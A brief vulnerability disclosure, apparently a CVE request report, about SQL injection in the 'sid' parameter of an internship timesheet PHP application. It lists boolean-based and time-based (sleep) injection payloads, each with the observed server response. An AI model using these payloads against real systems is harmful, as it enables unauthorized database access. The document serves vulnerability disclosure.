BUG_Author：wwlcz

Vulnerability File: /internship_timesheet/rendered_report.php

GET parameter 'sid' exists SQL injection vulnerability

Payload1: sid=1 and 777=777

The Boolean-based injection judgment is correct, so the page is displayed normally.

![image](https://github.com/MiserablefaithL/CVERequestReport/blob/main/sql1.png)

Payload2: sid=1 and 777=666

Boolean-based injection judgment error, so the page returns an exception.

![image](https://github.com/MiserablefaithL/CVERequestReport/blob/main/sql2.png)

Payload3: sid=1 and (select 2 from (select(sleep(5)))c)

The response time of the server is greater than 5 seconds.

![image](https://github.com/MiserablefaithL/CVERequestReport/blob/main/sql3.png)
